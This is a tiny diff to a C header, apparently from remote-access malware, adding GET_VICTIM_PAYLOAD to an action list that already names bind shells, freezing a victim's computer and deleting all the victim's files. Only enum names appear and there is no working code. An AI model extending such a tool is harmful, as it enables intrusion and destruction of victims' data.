@@ -45,6 +45,7 @@ typedef enum {
 	SEND_BIND_SHELL_COMMAND,
 	STUCK_VICTIMS_COMPUTER,
 	DELETE_VICTIMS_ALL_FILES,
+	GET_VICTIM_PAYLOAD,
 } action_type;
 
 typedef enum {
